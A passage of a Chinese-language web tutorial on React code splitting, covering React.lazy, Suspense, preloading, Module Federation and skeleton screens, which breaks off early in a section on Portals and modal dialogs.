class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 预加载组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">PreloadComponent</span>(<span class="hljs-params">&#123; component &#125;</span>) &#123;<br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    component.<span class="hljs-title function_">preload</span>();<br>  &#125;, [component]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">// 路由预加载</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 预加载可能访问的页面</span><br>    <span class="hljs-keyword">const</span> preloadPages = [<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/AboutPage&#x27;</span>),<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/ContactPage&#x27;</span>)<br>    ];<br>    <br>    <span class="hljs-comment">// 用户空闲时预加载</span><br>    <span class="hljs-keyword">const</span> idleCallback = <span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      preloadPages.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">preload</span> =&gt;</span> <span class="hljs-title function_">preload</span>());<br>    &#125;);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">cancelIdleCallback</span>(idleCallback);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">HomePage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Loader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            &lt;React.lazy(() =&gt; import(&#x27;./pages/AboutPage&#x27;)) /&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        &#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/contact&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Loader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            &lt;React.lazy(() =&gt; import(&#x27;./pages/ContactPage&#x27;)) /&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        &#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 悬停预加载 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/about&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onMouseEnter</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> import(&#x27;./pages/AboutPage&#x27;)&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        关于我们</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">NavLink</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="性能优化进阶技巧"><a href="#性能优化进阶技巧" class="headerlink" title="性能优化进阶技巧"></a>性能优化进阶技巧</h3><p><strong>模块联合（微前端）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 动态加载远程模块</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span><br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;remote_app/Component&#x27;</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> <br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./FallbackComponent&#x27;</span>)<br>  )<br>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">RemoteLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">RemoteComponent</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// Webpack 配置</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;host_app&#x27;</span>,<br>      <span class="hljs-attr">remotes</span>: &#123;<br>        <span class="hljs-attr">remote_app</span>: <span class="hljs-string">&#x27;remote_app@http://remote-domain.com/remoteEntry.js&#x27;</span><br>      &#125;<br>    &#125;)<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>资源优先级控制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 预加载关键资源</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CriticalResourceLoader</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Head</span>&gt;</span></span><br><span class="language-xml">      &#123;/* 关键 CSS */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/critical.css&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;style&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">&quot;this.rel=&#x27;stylesheet&#x27;&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 关键脚本 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;modulepreload&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/main.js&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;script&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 字体预加载 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">link</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/fonts/inter.woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;font&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;font/woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">crossOrigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Head</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 延迟加载非关键资源</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">LazyNonCritical</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadNonCritical</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./analytics.js&#x27;</span>);<br>      <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./chat-widget.js&#x27;</span>);<br>    &#125;;<br>    <br>    <span class="hljs-comment">// 空闲时加载</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;requestIdleCallback&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) &#123;<br>      <span class="hljs-title function_">requestIdleCallback</span>(loadNonCritical);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">setTimeout</span>(loadNonCritical, <span class="hljs-number">5000</span>);<br>    &#125;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>骨架屏优化技巧</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 高级骨架屏组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductCardSkeleton</span>(<span class="hljs-params">&#123; count = <span class="hljs-number">1</span> &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(&#123; <span class="hljs-attr">length</span>: count &#125;).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;index&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-card&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-image&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-line w-3/4&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-line w-1/2&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;skeleton-line w-1/3&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  ));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs CSS">// CSS 动画优化<br><span class="hljs-keyword">@keyframes</span> pulse &#123;<br>  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; &#125;<br>&#125;<br><br><span class="hljs-selector-class">.skeleton-card</span> &#123;<br>  <span class="hljs-attribute">animation</span>: pulse <span class="hljs-number">2s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.6</span>, <span class="hljs-number">1</span>) infinite;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e5e7eb</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0.5rem</span>;<br>  <span class="hljs-attribute">overflow</span>: hidden;<br>&#125;<br><br><span class="hljs-selector-class">.skeleton-line</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">1rem</span>;<br>  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0.75rem</span>;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#d1d5db</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0.25rem</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="常见问题与解决方案"><a href="#常见问题与解决方案" class="headerlink" title="常见问题与解决方案"></a>常见问题与解决方案</h3><p><strong>大型模块加载优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 分块加载大型模块</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadLargeModule</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [part1, part2, part3] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./modulePart1&#x27;</span>),<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./modulePart2&#x27;</span>),<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./modulePart3&#x27;</span>)<br>  ]);<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    ...part1,<br>    ...part2,<br>    ...part3<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 渐进式加载</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">LargeComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-comment">// 先加载核心部分</span><br>  <span class="hljs-keyword">const</span> core = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./CoreComponent&#x27;</span>);<br>  <br>  <span class="hljs-comment">// 空闲时加载增强部分</span><br>  <span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> enhancements = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Enhancements&#x27;</span>);<br>    core.<span class="hljs-title function_">enhance</span>(enhancements);<br>  &#125;);<br>  <br>  <span class="hljs-keyword">return</span> core;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li>核心价值：<ul><li>显著减少首屏加载时间</li><li>按需加载提升资源利用率</li><li>改善用户体验</li></ul></li><li>关键技术：<ul><li>React.lazy：组件动态导入</li><li>Suspense：加载状态管理</li><li>动态 import()：代码分割基础</li></ul></li><li>最佳实践：<ul><li>路由级分割：按页面拆分</li><li>组件级懒加载：非核心功能延迟加载</li><li>预加载优化：预测用户行为</li><li>骨架屏技术：优化加载体验</li></ul></li><li>React 18 增强：<ul><li>流式 SSR 渲染</li><li>并发模式下的 Suspense</li><li>更精细的加载控制</li></ul></li><li>企业级方案：<ul><li>错误边界集成</li><li>微前端架构支持</li><li>性能监控与分析</li></ul></li><li>常见问题解决：<ul><li>加载闪烁控制</li><li>模块加载失败处理</li><li>大型模块优化</li></ul></li></ul><h2 id="4-4-Portals（渲染到-DOM-外部节点）"><a href="#4-4-Portals（渲染到-DOM-外部节点）" class="headerlink" title="4.4 Portals（渲染到 DOM 外部节点）"></a>4.4 Portals（渲染到 DOM 外部节点）</h2><h3 id="Portals-核心概念"><a href="#Portals-核心概念" class="headerlink" title="Portals 核心概念"></a>Portals 核心概念</h3><p><strong>解决的问题场景</strong></p><pre class="mermaid">graph TD    A[父组件] --> B[overflow: hidden]    A --> C[z-index 层级限制]    A --> D[transform 上下文]    B --> E[子元素显示不全]    C --> F[模态框被遮挡]    D --> G[fixed 定位失效]</pre><p><strong>Portals 核心能力</strong></p><table><thead><tr><th align="left">能力</th><th align="left">描述</th><th align="left">应用场景</th></tr></thead><tbody><tr><td align="left">突破层级限制</td><td align="left">渲染到 DOM 树任意位置</td><td align="left">模态框、弹出层</td></tr><tr><td align="left">保留 React 上下文</td><td align="left">保持事件冒泡和上下文</td><td align="left">全局通知</td></tr><tr><td align="left">样式隔离</td><td align="left">避免父容器样式影响</td><td align="left">工具提示</td></tr><tr><td align="left">无障碍支持</td><td align="left">管理焦点和键盘事件</td><td align="left">无障碍对话框</td></tr></tbody></table><h3 id="基础用法与API"><a href="#基础用法与API" class="headerlink" title="基础用法与API"></a>基础用法与API</h3><p><strong>ReactDOM.createPortal 基础</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">ReactDOM</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Modal</span>(<span class="hljs-params">&#123; children, isOpen &#125;</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!isOpen) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-comment">// 创建 Portal 渲染到 body 外的独立容器</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-content&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;modal-root&#x27;</span>) <span class="hljs-comment">// 外部容器</span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 在 public/index.html 中添加容器</span><br>&lt;body&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;modal-root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span> &lt;!-- <span class="hljs-title class_">Portal</span> 目标容器 --&gt;<br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><strong>动态容器管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SmartPortal</span>(<span class="hljs-params">&#123; children, containerId = <span class="hljs-string">&#x27;portal-root&#x27;</span> &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [container, setContainer] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 查找或创建容器</span><br>    <span class="hljs-keyword">let</span> portalContainer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(containerId);<br>    <br>    <span class="hljs-keyword">if</span> (!portalContainer) &#123;<br>      portalContainer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>      portalContainer.<span class="hljs-property">id</span> = containerId;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(portalContainer);<br>    &#125;<br>    <br>    <span class="hljs-title function_">setContainer</span>(portalContainer);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// 清理容器</span><br>      <span class="hljs-keyword">if</span> (portalContainer) &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(portalContainer);<br>      &#125;<br>    &#125;;<br>  &#125;, [containerId]);<br>  <br>  <span class="hljs-keyword">if</span> (!container) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(children, container);<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br>&lt;<span class="hljs-title class_">SmartPortal</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Notification</span> <span class="hljs-attr">message</span>=<span class="hljs-string">&quot;操作成功！&quot;</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">SmartPortal</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="核心应用场景"><a href="#核心应用场景" class="headerlink" title="核心应用场景"></a>核心应用场景</h3><p><strong>模态对话框实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ModalDialog</span>(<span class="hljs-params">&#123; title, children, onClose &#125;</span>) &#123;<br>  <span class="hljs-comment">// 阻止背景滚动</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span 